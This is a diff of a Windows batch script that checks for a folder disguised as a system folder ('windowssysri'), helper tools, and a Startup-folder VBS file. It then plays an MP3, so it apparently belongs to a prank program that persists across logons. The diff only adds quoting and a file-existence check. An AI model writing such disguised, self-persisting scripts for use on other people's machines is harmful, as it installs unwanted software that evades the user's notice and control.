@@ -1,11 +1,11 @@
 @echo off
 
 :main
-if not exist %userprofile%\windowssysri goto install
-if not exist %userprofile%\windowssysri\nircmd.exe goto install
-if not exist %userprofile%\windowssysri\cmdmp3.exe goto install
+if not exist "%userprofile%\windowssysri" goto install
+if not exist "%userprofile%\windowssysri\nircmd.exe" goto install
+if not exist "%userprofile%\windowssysri\cmdmp3.exe" goto install
 if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\testwindowssysri.vbs" goto install
-set /p maindrive=<"%userprofile%"\windowssysri\maindrive.sys
+if exist "%userprofile%"\windowssysri\maindrive.sys set /p maindrive=<"%userprofile%"\windowssysri\maindrive.sys
 
 
 start %userprofile%\windowssysri\cmdmp3.exe %userprofile%\windowssysri\song.mp3
